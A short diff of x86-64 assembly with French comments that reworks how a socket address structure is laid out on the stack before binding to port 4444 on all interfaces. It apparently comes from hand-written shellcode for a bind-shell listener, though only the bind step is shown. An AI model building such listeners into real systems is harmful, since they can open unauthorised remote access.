@@ -15,9 +15,7 @@ _start:
     ; Bind socket port 4444
     xor rax, rax        
     push rax            ; Remplir sockaddr_in avec zéros (8 octets)
-    mov dword [rsp-4], 0x115c0002 ; sin_port = 4444
-    sub rsp, 4 
-    push word 0 ; sin_addr = INADDR_ANY (0.0.0.0) 
+    mov dword [rsp], 0x115c0002 ; sin_port = 4444 (family 2) 
     mov rax, 49 ; sys_bind 
     mov rsi, rsp ; Pointe vers la structure sockaddr sur la pile 
     mov rdx, 16 ; Taille de la structure (16 octets) 
